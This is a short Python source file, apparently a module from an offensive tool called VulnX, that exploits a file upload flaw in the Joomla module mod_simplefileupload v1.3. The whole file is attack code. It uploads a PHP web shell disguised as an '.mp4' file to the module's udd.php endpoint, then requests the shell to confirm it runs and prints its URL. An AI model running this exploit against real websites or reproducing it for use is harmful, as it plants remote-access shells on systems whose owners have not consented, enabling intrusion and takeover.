import re
import os
import requests

def mod_simplefileupload(url,headers):
    s = requests.session()
    endpoint = url + "/modules/mod_simplefileuploadv1.3/elements/udd.php"
    img = open('shell/VulnX.php.mp4', 'rb')
    name_img= os.path.basename('shell/VulnX.php.mp4')
    files= {'image': (name_img,img,'multipart/form-data',{'Expires': '0'})}
    upload_file = s.post(endpoint,files=files, headers=headers)
    shellup = url + "/modules/mod_simplefileuploadv1.3/elements/VulnX.php?Vuln=X"
    checkShell = requests.get(shellup).text
    statusCheck = re.findall(re.compile(r'Vuln X'),checkShell)
    if statusCheck:
        print('[+] mod_simplefileupload ', shellup)
    else:
        print('[-] mod_simplefileupload')